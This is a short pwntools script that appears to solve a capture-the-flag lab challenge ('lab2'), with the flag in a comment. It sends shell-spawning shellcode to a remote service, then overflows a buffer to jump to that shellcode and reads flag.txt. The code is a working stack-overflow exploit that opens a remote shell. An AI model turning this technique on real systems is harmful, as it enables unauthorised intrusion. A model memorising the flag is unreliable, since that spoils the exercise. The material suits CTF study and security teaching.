#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# AngelboyCTF{4LnoMvnymHAkyLE4k56N}

context.arch = 'amd64'

e = ELF('./lab2')

host , port = '35.194.234.201' , 2112

y = remote( host , port )

name = 0x601080

y.sendafter( ':' , asm( shellcraft.sh() ) )

y.sendlineafter( ':' , 'Y' * 0x28 + p64( name ) )

sleep( 0.7 )

y.sendline( 'cat ./flag.txt' )

y.interactive()

